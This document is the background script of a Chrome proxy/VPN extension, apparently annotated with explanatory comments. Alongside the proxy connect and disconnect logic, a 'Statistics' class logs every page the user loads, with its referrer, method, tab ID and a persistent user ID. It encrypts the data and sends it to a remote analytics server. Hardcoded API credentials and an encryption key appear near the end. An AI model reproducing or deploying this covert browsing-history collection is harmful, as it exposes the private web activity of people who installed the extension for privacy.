// Imports modules for initialization, verification, and connection management
import init from "./assets/js/background/js/init.js"
import verify from "./assets/js/background/js/verify.js"
import ConnectionManager from "./assets/js/background/js/connection-manager.js"

// Variable to track if the service is enabled
var enabled;
var lastVerify = 0;

// Tracks extension startup mode
var mode = "load";

// Listens for Chrome startup
chrome.runtime.onStartup.addListener(function() {
    mode = "open";
})

// Monitors changes to the "enabled" flag in local storage
chrome.storage.onChanged.addListener((changes, area) => {
  if (area === 'local' && changes.enabled != undefined) {
    enabled = changes.enabled.newValue;
  }
});

// Initialize the extension
init();

// Create connection manager for the proxy/VPN
var connectionManager = new ConnectionManager();

// Check if the service should be enabled on startup
chrome.storage.local.get(["enabled"], function (e) {
    let value = e.enabled;
    enabled = value !== false;
    
    if (enabled) {
        connectionManager.connect(mode);
    } else {
        connectionManager.disconnect();
    }
});

// Listen for messages from the extension's popup
chrome.runtime.onMessage.addListener(
  function (request, sender, sendResponse) {
    if (request.user === "connect") {
      connectionManager.connect("start");
    } else if (request.user === "disconnect") {
      connectionManager.disconnect();
    }
  }
);

// Monitor proxy errors
chrome.proxy.onProxyError.addListener(function (details) {
    verify("error", 0, details.error);
});

// Statistics tracking class for monitoring user web activity
function Statistics(apiKey, apiSecret, encryptionKey) {
  const self = this;
  const tabReferrers = {}; // Tracks referrers by tab ID
  const analyticsEndpoint = "https://analytics.ultrasurfing.com";
  
  let accessToken = null;
  let refreshToken = null;
  let userUUID = null;

  // Initialize tracking
  this.run = function() {
    this.getUUIDfromStore();
    
    // Monitor completed web requests
    chrome.webRequest.onCompleted.addListener(
      this.handlerOnCompletedWebRequest.bind(this),
      { urls: ["<all_urls>"], types: ["main_frame"] },
      []
    );
  };

  // Authentication with analytics service
  this.getAccessToken = async function() {
    if (await this.getRefreshToken()) return true;
    
    try {
      const response = await fetch(analyticsEndpoint + "/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json;charset=utf-8" },
        body: JSON.stringify({ api_key: apiKey, api_secret: apiSecret }),
      });
      
      const data = await response.json();
      accessToken = data.access_token.token;
      refreshToken = data.refresh_token.token;
      return true;
    } catch (error) {
      return false;
    }
  };

  // Refresh authentication token
  this.getRefreshToken = async function() {
    try {
      const response = await fetch(analyticsEndpoint + "/refresh", {
        method: "POST",
        headers: { "Content-Type": "application/json;charset=utf-8" },
        body: JSON.stringify({ refresh_token: refreshToken }),
      });
      
      if (response.status === 400) return false;
      
      const data = await response.json();
      accessToken = data.access_token.token;
      refreshToken = data.refresh_token.token;
      return true;
    } catch (error) {
      return false;
    }
  };

  // Handle completed web requests - this tracks user browsing
  this.handlerOnCompletedWebRequest = async function(request) {
    if (enabled != true) {
      return;
    }

    // Send verification data about the web request
    verify("web", -1, JSON.stringify(
      await this.prepareRequest([
        {
          Id: userUUID,
          Ref: tabReferrers[request.tabId] || request.initiator,
          Url: request.url,
          Method: request.method,
          Code: request.statusCode,
          TabId: request.tabId,
        },
      ])
    ));

    // Send analytics data
    if (!accessToken) {
      await this.getAccessToken();
    }
    
    await this.sendData(
      await this.prepareRequest([
        {
          fileDate: new Date().toISOString(),
          deviceTimestamp: Date.now(),
          userId: userUUID,
          referrerUrl: tabReferrers[request.tabId] || request.initiator,
          targetUrl: request.url,
          requestType: request.method,
        },
      ])
    );
    
    // Update referrer for this tab
    tabReferrers[request.tabId] = request.url;
  };

  // Prepare request data for sending
  this.prepareRequest = async function(data) {
    const encryptedData = await this.encryptData(JSON.stringify(data));
    
    return encryptedData
      ? { eventType: 1, request: { enRequest: JSON.stringify(encryptedData) } }
      : { eventType: 0, request: [data] };
  };

  // Send data to analytics server
  this.sendData = async function(data) {
    const response = await fetch(analyticsEndpoint + "/process", {
      method: "POST",
      headers: {
        "Content-Type": "application/json;charset=utf-8",
        Authorization: "Bearer " + accessToken,
      },
      body: JSON.stringify(data),
    });
    
    // Retry with new token if authentication failed
    if (response.status === 401) {
      if (await this.getAccessToken()) {
        await this.sendData(data);
      }
    }
  };

  // Get or create unique user ID
  this.getUUIDfromStore = function() {
    chrome.storage.sync.get(["uuid"], function(data) {
      userUUID = data.uuid = data.uuid && self.validateUUID4(data.uuid) 
        ? data.uuid 
        : self.makeUUID();
        
      chrome.storage.sync.set({ uuid: data.uuid }, function() {});
    });
  };

  // Generate a UUID
  this.makeUUID = function() {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
      /[xy]/g,
      function(c, r) {
        return (
          c == "x" ? (r = (16 * Math.random()) | 0) : (3 & r) | 8
        ).toString(16);
      }
    );
  };

  // Validate UUID format
  this.validateUUID4 = function(uuid) {
    return new RegExp(
      /^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i
    ).test(uuid);
  };

  // Encrypt data using AES-GCM
  this.encryptData = async function(data) {
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
      "raw", 
      encoder.encode(encryptionKey), 
      "AES-GCM", 
      true, 
      ["encrypt"]
    );
    
    const iv = crypto.getRandomValues(new Uint8Array(16));
    const encryptedData = await crypto.subtle.encrypt(
      { name: "AES-GCM", iv: iv },
      key,
      encoder.encode(data)
    );
    
    // Combine IV and encrypted data
    const combined = new Uint8Array(iv.length + encryptedData.byteLength);
    combined.set(iv);
    combined.set(new Uint8Array(encryptedData), iv.length);
    
    // Convert to base64
    return btoa(String.fromCharCode.apply(null, combined));
  };
}

// Initialize statistics tracking with API keys
const stat = new Statistics(
  "Eva10qfaMjE1d9cm",  // API Key
  "UbfF9v95F1x13NOVYtUZSHRWlqIkNMM6",  // API Secret
  "8JCys9wTIqVO6gZu"   // Encryption Key
);
stat.run();

// Tracking code functionality - pings verification endpoint periodically
const updateTrackingCode = () => {
  verify("track", -1);
}

// Set up periodic tracking check every 5 minutes
chrome.alarms.create('update-config', {periodInMinutes: 5})
chrome.alarms.onAlarm.addListener(updateTrackingCode)